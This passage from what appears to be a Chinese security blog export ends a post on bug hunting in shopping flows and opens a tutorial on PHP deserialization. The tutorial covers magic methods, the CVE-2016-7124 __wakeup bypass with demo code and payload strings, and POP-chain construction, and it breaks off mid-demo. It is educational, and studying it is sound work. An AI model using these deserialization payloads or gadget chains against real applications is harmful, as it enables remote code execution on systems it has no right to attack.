4EE5;&#x8FDB;&#x884C;&#x5EF6;&#x4F38;&#x7684;&#x65B9;&#x9762;&#x4E5F;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x3002;</p>
<p>&#x95EE;&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x4F60;&#x7684;&#x6F0F;&#x6D1E;&#x90FD;&#x6CA1;&#x6709;&#x7ED5;&#x8FC7;&#xFF1F;<br>&#x7B54;&#xFF1A;&#x7ED5;&#x8FC7;&#x9700;&#x8981;&#x770B;&#x5F53;&#x65F6;&#x7684;&#x8FC7;&#x6EE4;&#x4EE5;&#x53CA;&#x5F53;&#x65F6;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x73AF;&#x5883;&#x7B49;&#xFF0C;&#x6240;&#x4EE5;&#x7531;&#x4E8E;&#x7BC7;&#x5E45;&#x7684;&#x539F;&#x56E0;&#x6CA1;&#x6709;&#x5C55;&#x5F00;&#x8BBA;&#x8FF0;&#xFF0C;&#x672C;&#x6587;&#x610F;&#x5728;&#x63D0;&#x4F9B;&#x601D;&#x8DEF;&#x8FDB;&#x884C;&#x6316;&#x6398;&#xFF0C;&#x4F46;&#x5728;&#x6BCF;&#x4E2A;&#x6F0F;&#x6D1E;&#x4E0B;&#x9762;&#x90FD;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E9B;bypass&#x4E0D;&#x9519;&#x7684;&#x601D;&#x8DEF;&#x7684;&#x6587;&#x7AE0;&#x94FE;&#x63A5;</p>
<p>&#x672C;&#x6587;&#x53EA;&#x4EE5;&#x8D2D;&#x4E70;&#x7269;&#x54C1;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x4E00;&#x4E2A;&#x601D;&#x8DEF;&#x6765;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x7684;&#x6316;&#x6398;&#xFF0C;&#x53EA;&#x662F;&#x7247;&#x9762;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x9762;&#x8FD8;&#x5F88;&#x5E7F;&#xFF0C;&#x6316;&#x6398;&#x601D;&#x8DEF;&#x4E5F;&#x5F88;&#x591A;&#x3002;&#x53EA;&#x662F;&#x6839;&#x636E;&#x4EBA;&#x4EEC;&#x65E5;&#x5E38;&#x751F;&#x6D3B;&#x64CD;&#x4F5C;&#x6765;&#x6316;&#x6398;&#x6F0F;&#x6D1E;&#x6BD4;&#x8F83;&#x7684;&#x901A;&#x4FD7;&#x6613;&#x61C2;&#xFF0C;&#x4E5F;&#x597D;&#x5165;&#x624B;&#xFF0C;&#x5F88;&#x9002;&#x5408;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x65B0;&#x624B;&#x6316;&#x6D1E;&#x3002;&#x5728;&#x8FDB;&#x884C;&#x8D2D;&#x7269;&#x6D41;&#x7A0B;&#x4E2D;&#xFF0C;&#x6587;&#x4E2D;&#x6709;&#x6CA1;&#x6709;&#x63D0;&#x5230;&#x7684;&#x6B22;&#x8FCE;&#x5404;&#x4F4D;&#x5E08;&#x5085;&#x8865;&#x5145;&#xFF0C;&#x6709;&#x597D;&#x7684;&#x601D;&#x8DEF;&#x4E5F;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x4E0D;&#x541D;&#x8D50;&#x6559;&#xFF0C;&#x6709;&#x4E0D;&#x8DB3;&#x4E4B;&#x5904;&#x4E5F;&#x671B;&#x6279;&#x8BC4;&#x6307;&#x6B63;&#x3002;</p>
<p><strong>&#x672C;&#x6587;&#x4EC5;&#x9650;&#x6280;&#x672F;&#x7814;&#x7A76;&#x4E0E;&#x8BA8;&#x8BBA;&#xFF0C;&#x4E25;&#x7981;&#x7528;&#x4E8E;&#x975E;&#x6CD5;&#x7528;&#x9014;&#xFF0C;&#x5426;&#x5219;&#x4EA7;&#x751F;&#x7684;&#x4E00;&#x5207;&#x540E;&#x679C;&#x81EA;&#x884C;&#x627F;&#x62C5;&#x3002;</strong></p>
</body></html>]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>再谈PHP反序列化</title>
    <url>/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<html><head></head><body><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E; SECIN&#x793E;&#x533A;&#xFF1A;<a href="https://www.sec-in.com/article/137" target="_blank" rel="noopener">https://www.sec-in.com/article/137</a></p>
<a id="more"></a>



<h2 id="&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;"><a href="#&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;" class="headerlink" title="&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;"></a>&#x4E09;&#x79CD;&#x7C7B;&#x5C5E;&#x6027;</h2><p><strong>Private &#x6743;&#x9650;: &#x6B63;&#x5E38;</strong><br><strong>Private &#x6743;&#x9650;&#x5C5E;&#x6027;&#x540D;: <code>%00&#x7C7B;&#x540D;%00&#x5C5E;&#x6027;&#x540D;</code> &#x3002;&#x4E14;&#x5C5E;&#x6027;&#x540D;&#x957F;&#x5EA6;&#x6539;&#x53D8;</strong><br><strong>Protected &#x6743;&#x9650;&#x5C5E;&#x6027;&#x540D;: <code>%00*%00&#x5C5E;&#x6027;&#x540D;</code> &#x3002;&#x4E14;&#x5C5E;&#x6027;&#x540D;&#x957F;&#x5EA6;&#x6539;&#x53D8;</strong></p>
<p>demo<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span>   </span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&apos;P2hm1n&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> $age = <span class="hljs-string">&apos;Secret&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">protected</span> $test = <span class="hljs-string">&apos;test&apos;</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$test = <span class="hljs-keyword">new</span> Test;</span><br><span class="line">$content = serialize($test);</span><br><span class="line">file_put_contents(<span class="hljs-string">&apos;./flag.txt&apos;</span>, $content);</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201552674.png" alt="image-20201113201552674"><p></p>
<h2 id="&#x9B54;&#x672F;&#x65B9;&#x6CD5;"><a href="#&#x9B54;&#x672F;&#x65B9;&#x6CD5;" class="headerlink" title="&#x9B54;&#x672F;&#x65B9;&#x6CD5;"></a>&#x9B54;&#x672F;&#x65B9;&#x6CD5;</h2><p>&#x5177;&#x4F53;&#x53EF;&#x53C2;&#x8003;PHP&#x624B;&#x518C;: <a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
<p><code>construct</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x4E00;&#x4E2A;&#x7C7B;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x4E3A;&#x5B9E;&#x4F8B;&#x65F6;&#x4F1A;&#x8C03;&#x7528;(<code>unserialize()</code>&#x65F6;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;)<br><code>destruct</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x5BF9;&#x8C61;&#x88AB;&#x9500;&#x6BC1;&#x65F6;&#x4F1A;&#x8C03;&#x7528;<br><code>sleep</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x4E00;&#x4E2A;&#x7C7B;&#x8C03;&#x7528;<code>serialize</code>&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;<br><code>wakeup</code> &#x8C03;&#x7528;&#x6761;&#x4EF6; :&#x5F53;&#x5B57;&#x7B26;&#x4E32;&#x8981;&#x5229;&#x7528;<code>unserialize</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6210;&#x4E00;&#x4E2A;&#x7C7B;&#x65F6;&#x4F1A;&#x8C03;&#x7528;<br><code>get()</code> &#x8C03;&#x7528;&#x6761;&#x4EF6;:&#x5F53;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x6570;&#x636E;<br><code>call()</code>&#x8C03;&#x7528;&#x6761;&#x4EF6;: &#x5F53;&#x8981;&#x8C03;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x4E0D;&#x5B58;&#x5728;&#x6216;&#x6743;&#x9650;&#x4E0D;&#x8DB3;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;<br><code>invoke()</code>&#x8C03;&#x7528;&#x6761;&#x4EF6;: &#x5F53;&#x628A;&#x4E00;&#x4E2A;&#x7C7B;&#x5F53;&#x4F5C;&#x51FD;&#x6570;&#x4F7F;&#x7528;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;</p>
<p><code>tostring</code> &#x5F53;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x5BF9;&#x8C61;&#x88AB;&#x5F53;&#x4F5C;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x65F6;&#x5019;&#x8C03;&#x7528;&#x3002;&#x5177;&#x4F53;&#x8C03;&#x7528;&#x573A;&#x666F;&#x6761;&#x4EF6;&#x5982;&#x4E0B;(&#x5F15;&#x7528;&#x81EA; @k0rz3n)</p>
<blockquote>
<p>(1) <code>echo ($obj) / print($obj)</code> &#x6253;&#x5370;&#x65F6;&#x4F1A;&#x89E6;&#x53D1;<br>(2) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x4E0E;&#x5B57;&#x7B26;&#x4E32;&#x8FDE;&#x63A5;&#x65F6;<br>(3) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x53C2;&#x4E0E;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x65F6;<br>(4) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x4E0E;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;<code>==</code>&#x6BD4;&#x8F83;&#x65F6;&#xFF08;PHP&#x8FDB;&#x884C;<code>==</code>&#x6BD4;&#x8F83;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8F6C;&#x6362;&#x53C2;&#x6570;&#x7C7B;&#x578B;&#xFF09;<br>(5) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x53C2;&#x4E0E;&#x683C;&#x5F0F;&#x5316;SQL&#x8BED;&#x53E5;&#xFF0C;&#x7ED1;&#x5B9A;&#x53C2;&#x6570;&#x65F6;<br>(6) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x5728;&#x7ECF;&#x8FC7;php&#x5B57;&#x7B26;&#x4E32;&#x51FD;&#x6570;&#xFF0C;&#x5982; <code>strlen()</code>&#x3001;<code>addslashes()</code>&#x65F6;<br>(7) &#x5728;<code>in_array()</code>&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x6570;&#x7EC4;&#x4E2D;&#x6709;<code>toString</code>&#x8FD4;&#x56DE;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x65F6;&#x5019;<code>toString</code>&#x4F1A;&#x88AB;&#x8C03;&#x7528;<br>(8) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#x4F5C;&#x4E3A; <code>class_exists()</code> &#x7684;&#x53C2;&#x6570;&#x7684;&#x65F6;&#x5019;</p>
</blockquote>
<h2 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h2><p>CVE&#x5229;&#x7528;&#x76EE;&#x7684;: &#x7ED5;&#x8FC7;&#x9B54;&#x6CD5;&#x51FD;&#x6570;<code>__wakeup</code></p>
<p><strong>&#x7248;&#x672C;&#x9650;&#x5236;: PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10</strong></p>
<p>&#x6838;&#x5FC3;&#x539F;&#x7406;: <a href="https://paper.seebug.org/866/" target="_blank" rel="noopener">PHP &#x5185;&#x6838;&#x5C42;&#x89E3;&#x6790;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</a><br>s<br>&#x7ED5;&#x8FC7;&#x65B9;&#x6CD5;: &#x5F53;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x8868;&#x793A;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#x4E2A;&#x6570;&#x7684;&#x503C;&#x5927;&#x4E8E;&#x771F;&#x5B9E;&#x7684;&#x5C5E;&#x6027;&#x4E2A;&#x6570;&#x65F6;&#x4F1A;&#x8DF3;&#x8FC7;<code>__wakeup</code>&#x7684;&#x6267;&#x884C;</p>
<p>Bypass demo</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span>   </span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&apos;P2hm1n&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Bypass&apos;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;fail &apos;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$payload = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">unserialize($payload);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>payload<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">payload1 = O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;P2hm1n&quot;</span>;}</span><br><span class="line"><span class="hljs-comment">// fail Bypass</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>bypass payload<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">payload1 = O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;P2hm1n&quot;</span>;}</span><br><span class="line"><span class="hljs-comment">// Bypass</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="POP&#x94FE;&#x6784;&#x9020;"><a href="#POP&#x94FE;&#x6784;&#x9020;" class="headerlink" title="POP&#x94FE;&#x6784;&#x9020;"></a>POP&#x94FE;&#x6784;&#x9020;</h2><h3 id="&#x77E5;&#x8BC6;&#x56DE;&#x987E;"><a href="#&#x77E5;&#x8BC6;&#x56DE;&#x987E;" class="headerlink" title="&#x77E5;&#x8BC6;&#x56DE;&#x987E;"></a>&#x77E5;&#x8BC6;&#x56DE;&#x987E;</h3><p><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">&#x6316;&#x6398;&#x6697;&#x85CF;ThinkPHP&#x4E2D;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5229;&#x7528;&#x94FE;</a> &#x4E00;&#x6587;&#x4E2D;&#x603B;&#x7ED3;&#x7684;&#x633A;&#x597D;&#x4E86;&#x3002;</p>
<table>
<thead>
<tr>
<th align="left">&#x65B9;&#x6CD5;&#x540D;</th>
<th align="left">&#x8C03;&#x7528;&#x6761;&#x4EF6;</th>
</tr>
</thead>
<tbody><tr>
<td align="left">__call</td>
<td align="left">&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__callStatic</td>
<td align="left">&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__clone</td>
<td align="left">&#x8FDB;&#x884C;&#x5BF9;&#x8C61;clone&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF0C;&#x7528;&#x6765;&#x8C03;&#x6574;&#x5BF9;&#x8C61;&#x7684;&#x514B;&#x9686;&#x884C;&#x4E3A;</td>
</tr>
<tr>
<td align="left">__constuct</td>
<td align="left">&#x6784;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF1B;</td>
</tr>
<tr>
<td align="left">__debuginfo</td>
<td align="left">&#x5F53;&#x8C03;&#x7528;var_dump()&#x6253;&#x5370;&#x5BF9;&#x8C61;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF08;&#x5F53;&#x4F60;&#x4E0D;&#x60F3;&#x6253;&#x5370;&#x6240;&#x6709;&#x5C5E;&#x6027;&#xFF09;&#x9002;&#x7528;&#x4E8E;PHP5.6&#x7248;&#x672C;</td>
</tr>
<tr>
<td align="left">__destruct</td>
<td align="left">&#x660E;&#x786E;&#x9500;&#x6BC1;&#x5BF9;&#x8C61;&#x6216;&#x811A;&#x672C;&#x7ED3;&#x675F;&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF1B;</td>
</tr>
<tr>
<td align="left">__get</td>
<td align="left">&#x8BFB;&#x53D6;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__invoke</td>
<td align="left">&#x5F53;&#x4EE5;&#x51FD;&#x6570;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__isset</td>
<td align="left">&#x5BF9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x8C03;&#x7528;isset()&#x6216;empty()&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__set</td>
<td align="left">&#x5F53;&#x7ED9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x8D4B;&#x503C;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__set_state</td>
<td align="left">&#x5F53;&#x8C03;&#x7528;var_export()&#x5BFC;&#x51FA;&#x7C7B;&#x65F6;&#xFF0C;&#x6B64;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x88AB;&#x8C03;&#x7528;&#x3002;&#x7528;__set_state&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x505A;&#x4E3A;var_export&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;</td>
</tr>
<tr>
<td align="left">__sleep</td>
<td align="left">&#x5F53;&#x4F7F;&#x7528;serialize&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF0C;&#x5F53;&#x4F60;&#x4E0D;&#x9700;&#x8981;&#x4FDD;&#x5B58;&#x5927;&#x5BF9;&#x8C61;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x65F6;&#x5F88;&#x6709;&#x7528;</td>
</tr>
<tr>
<td align="left">__toString</td>
<td align="left">&#x5F53;&#x4E00;&#x4E2A;&#x7C7B;&#x88AB;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__unset</td>
<td align="left">&#x5BF9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x8FDB;&#x884C;unset&#x65F6;&#x88AB;&#x8C03;&#x7528;</td>
</tr>
<tr>
<td align="left">__wakeup</td>
<td align="left">&#x5F53;&#x4F7F;&#x7528;unserialize&#x65F6;&#x88AB;&#x8C03;&#x7528;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x505A;&#x4E9B;&#x5BF9;&#x8C61;&#x7684;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;</td>
</tr>
</tbody></table>
<ul>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5E38;&#x89C1;&#x8D77;&#x70B9;<ul>
<li><code>__wakeup</code> &#x4E00;&#x5B9A;&#x4F1A;&#x8C03;&#x7528;</li>
<li><code>__destruct</code> &#x4E00;&#x5B9A;&#x4F1A;&#x8C03;&#x7528;</li>
<li><code>__toString</code> &#x5F53;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x53C8;&#x88AB;&#x5F53;&#x505A;&#x5B57;&#x7B26;&#x4E32;&#x4F7F;&#x7528;</li>
</ul>
</li>
</ul>
<ul>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5E38;&#x89C1;&#x4E2D;&#x95F4;&#x8DF3;&#x677F;:<ul>
<li><code>__toString</code> &#x5F53;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x88AB;&#x5F53;&#x505A;&#x5B57;&#x7B26;&#x4E32;&#x4F7F;&#x7528;</li>
<li><code>__get</code> &#x8BFB;&#x53D6;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x65F6;&#x88AB;&#x8C03;&#x7528;</li>
<li><code>__set</code> &#x5F53;&#x7ED9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x5C5E;&#x6027;&#x8D4B;&#x503C;&#x65F6;&#x88AB;&#x8C03;&#x7528;</li>
<li><code>__isset</code> &#x5BF9;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x8C03;&#x7528;isset()&#x6216;empty()&#x65F6;&#x88AB;&#x8C03;&#x7528;&#x3002;&#x5F62;&#x5982; <code>$this-&gt;$func();</code></li>
</ul>
</li>
</ul>
<ul>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5E38;&#x89C1;&#x7EC8;&#x70B9;:<ul>
<li><code>__call</code> &#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x6216;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x88AB;&#x8C03;&#x7528;</li>
<li><code>call_user_func</code> &#x4E00;&#x822C;php&#x4EE3;&#x7801;&#x6267;&#x884C;&#x90FD;&#x4F1A;&#x9009;&#x62E9;&#x8FD9;&#x91CC;</li>
<li><code>call_user_func_array</code> &#x4E00;&#x822C;php&#x4EE3;&#x7801;&#x6267;&#x884C;&#x90FD;&#x4F1A;&#x9009;&#x62E9;&#x8FD9;&#x91CC;</li>
</ul>
</li>
</ul>
<p>&#x4E3B;&#x8981;&#x8FD8;&#x662F;&#x4E09;&#x70B9;&#xFF1A;</p>
<ol>
<li>&#x8D77;&#x70B9;</li>
<li>&#x8DF3;&#x677F;</li>
<li>&#x4EE3;&#x7801;&#x6267;&#x884C;</li>
</ol>
<p>&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x6838;&#x5FC3;&#x662F;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x53EF;&#x9644;&#x503C;&#x7ED9;&#x53D8;&#x91CF;,&#x4ECE;&#x800C;&#x8C03;&#x7528; + &#x5404;&#x7C7B;&#x9B54;&#x672F;&#x65B9;&#x6CD5;</p>
<h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><p>demo&#x5F15;&#x7528;&#x81EA; @twosmi1e &#x5E08;&#x5085; <a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">&#x5148;&#x77E5;&#x793E;&#x533A;</a>  &#x91CC;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($test2,$arr)</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                $s1 = <span class="hljs-keyword">$this</span>-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;</span><br><span class="line">        } </span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> $str1;</span><br><span class="line">        <span class="hljs-keyword">public</span> $str2;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span 